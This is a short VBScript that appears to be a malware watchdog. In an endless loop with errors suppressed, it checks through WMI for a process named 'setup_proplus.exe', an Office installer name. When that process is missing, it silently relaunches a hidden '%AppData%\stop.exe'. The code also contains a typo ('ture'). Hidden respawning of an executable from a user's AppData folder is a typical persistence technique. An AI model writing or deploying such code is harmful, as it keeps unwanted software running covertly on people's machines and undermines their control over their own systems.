On Error Resume Next
do
Set Of = CreateObject("Scripting.FileSystemObject")
set ws=createobject("wscript.shell")
dim OK,oShell
OK=False
set bag=getobject("winmgmts:\\.\root\cimv2")
set pipe=bag.execquery("select * from win32_process where name='setup_proplus.exe'")
For Each id In pipe
OK = True
Next
If not OK Then
ws.run"%AppData%\stop.exe",0,ture
wscript.sleep 1
end if
wscript.sleep 3000
loop